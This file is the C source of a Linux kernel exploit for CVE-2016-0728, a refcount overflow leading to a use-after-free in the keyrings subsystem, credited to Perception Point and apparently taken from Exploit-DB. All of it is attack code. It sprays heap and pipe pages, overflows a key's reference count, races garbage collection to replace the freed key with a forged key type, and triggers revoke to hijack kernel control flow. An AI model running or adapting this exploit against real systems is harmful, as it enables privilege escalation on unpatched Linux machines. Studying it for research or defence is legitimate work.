/*
# Exploit Title: Linux kernel REFCOUNT overflow/Use-After-Free in keyrings
# Date: 19/1/2016
# Exploit Author: Perception Point Team
# CVE : CVE-2016-0728
*/

/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */
/* $ ./cve_2016_072 PP_KEY */

/* EDB-Note: More information ~ http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/ */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <keyutils.h>
#include <unistd.h>
#include <time.h>
#include <unistd.h>
#include <sched.h>

#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>

#include <linux/membarrier.h>

#include "libexp.h"
#include "libpagespray.c"

#define STRUCT_LEN (0xc8 - 0x30)
#define FORK_NUM 0x40
#define CRASH_IP 0xffffffffdeadbeef

struct key_type {
    char *name;
    size_t datalen;
    void *vet_description;
    void *preparse;
    void *free_preparse;
    void *instantiate;
    void *update;
    void *match_preparse;
    void *match_free;
    void *revoke;
    void *destroy;
};

/* info sharing variables */
volatile int *stage = 0;
void *share;
struct msg_spray_t *spray_list[1000];
int spray_cnt = 0;
int cpu_id = 0;

/* exploit variables */
const char *keyring_name = "exploit_keyname";
key_serial_t serial = -1;
struct key_type my_key_type;
struct {
    long mtype;
    char mtext[STRUCT_LEN];
} msg = {0x4141414141414141, {0}};
char payload[256];
char take_page_back_buffer[0x1000];

// process function to help overwrite the victim object
void proc_func(int start, int end)
{
    // wait for the stage
    while(!*stage);

    for (int i = start ; i < end; i++) {
        write(pipe_pages[i][1], take_page_back_buffer, 0x1000);
        //usleep(100);
    }

    while(1);
}

void context_setup()
{
    key_serial_t tmp_serial = -1;

    /* Set the new session keyring before we start */
    tmp_serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "another_random_keyname");
    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
    if (serial < 0 || tmp_serial < 0)
        error_out("fail to create keyring");

    // config keyring so vulnerability can be triggered
    if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0)
        error_out("fail to config keyring");


    // fork stage FORK_NUM subprocesses
    for(int j=0; j<FORK_NUM; j++) {
        if(!fork()) {
            setsid();
            proc_func(j * (PIPE_PAGE_NUM / FORK_NUM), (j+1) * (PIPE_PAGE_NUM / FORK_NUM));
            exit(-1);
        }
    }
}

void payload_setup()
{
    // build up shared information among processes
    share = mmap((void *)(0x00000000fffffffe & 0xfffff000), 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON | MAP_FIXED, -1, 0);
    memset(share , 0, 0x2000);// prevent cow
    stage = (int *)share;
    *stage = 0;

    // prepare key_type
    my_key_type.revoke = (void *)CRASH_IP;

    // prepare msg
    memset(payload, '\x00', sizeof(payload));

    int offset = 0x30;
    // key->uid
    *(int*)(&payload[0x38 + offset]) = 0x3e8; /* geteuid() */
    //key->perm
    *(int*)(&payload[0x40 + offset]) = 0x3f3f3f3f;
    *(int*)(&payload[0x48 + offset]) = 1 << 3;
    *(int*)(&payload[0x50 + offset]) = 0x4;

    // //key->type
    *(unsigned long *)(&payload[0x58 + offset]) = (unsigned long)&my_key_type;
}

void trigger_gc()
{
    if(!clean_fork()) {
        setsid();
        // set_cpu((cpu_id+1) % cpu_num);
        key_serial_t tmp_serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "trigger_gc");
        if(keyctl(KEYCTL_REVOKE, tmp_serial) < 0) {
            error_out("fail to trigger gc");
        }
    }
}


void exploit(void)
{
    int ret;
    for (int i=0; i<0x1000/sizeof(payload); i++) {
        memcpy(&take_page_back_buffer[i * sizeof(payload)], payload, sizeof(payload));
    }

    struct msg_spray_t *warmup = msg_spray(NULL, 0x100 - 0x30, 0x1000);
    msg_spray_clean(warmup);

    prep();
    spray_list[spray_cnt++] = msg_spray(NULL, 0x100 - 0x30, 0x1000);

    context_setup();

    spray_list[spray_cnt++] = msg_spray(NULL, 0x100 - 0x30, 0x1000);

    // increase refcount to trigger our inserted backdoor
    puts("Increfing...");
    for (int i = 1; i < 0x100-1-FORK_NUM; i++) {
        usleep(10000);
        if( i >= 0x100-3-FORK_NUM - 5) {
            sleep(2);
        }
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0)
            error_out("fail to inc refcount");
    }

    /* here we are going to increase the last references to overflow */
    for (int i=0; i<4; ++i) {
        printf("final i: %x\n", i);
        sleep(3);
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0)
            error_out("fail to inc the final several refcounts");
    }

    // now the key has 0 refcount
    // trigger gc and then race to overwrite the object
    puts("ready? go!");
    trigger_gc();

    for (int i = 0; i < spray_cnt; i++) {
        msg_spray_clean(spray_list[i]);
    }

	//syscall(__NR_membarrier, MEMBARRIER_CMD_SHARED, 0, 0);

    for (int i = 0x0 ; i < PIPE_PAGE_NUM; i++) {
        ret = write(pipe_pages[i][1], take_page_back_buffer, 0x1000);
        usleep(200);
    }
    // *stage = 1;

    // wait for everything to stop
    sleep(2);
    puts("done!");
}

void trigger(void)
{
    /* call userspace_revoke from kernel */
    puts("caling revoke...");
    if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
        perror("keyctl_revoke");
    }
}

int get_cpu_id(int argc, char **argv)
{
    if(argc < 2) return 0;
    int run_time = atoi(argv[1]);
    return run_time % cpu_num;
}

int main(int argc, char **argv)
{
    cpu_id = get_cpu_id(argc, argv);
    set_cpu(cpu_id);
    setsid();

    payload_setup();
    //context_setup();
    exploit();
    trigger();
    return 0;
}
